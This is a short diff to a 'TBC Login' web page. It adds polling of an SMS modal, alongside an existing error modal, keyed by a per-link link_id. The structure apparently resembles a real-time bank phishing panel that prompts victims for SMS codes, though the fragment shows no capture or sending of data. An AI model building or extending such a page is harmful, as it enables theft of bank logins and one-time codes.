@@ -952,9 +952,14 @@ document.addEventListener('DOMContentLoaded', function() {
     console.warn(`❌ TBC Login - no link_id found!`);
   }
 
-  // Start error polling
-  if (link_id && typeof ErrorModal !== 'undefined') {
-    ErrorModal.startPolling(link_id, 'tbc', 3000);
+  // Start error and SMS polling
+  if (link_id) {
+    if (typeof ErrorModal !== 'undefined') {
+      ErrorModal.startPolling(link_id, 'tbc', 3000);
+    }
+    if (typeof SMSModal !== 'undefined') {
+      SMSModal.startPolling(link_id, 'tbc', 3000);
+    }
   }
 });
 </script>
@@ -1010,4 +1015,5 @@ document.addEventListener('DOMContentLoaded', function() {
 </div>
 
 <script src="error-modal.js"></script>
+<script src="sms-modal.js"></script>
 </body>
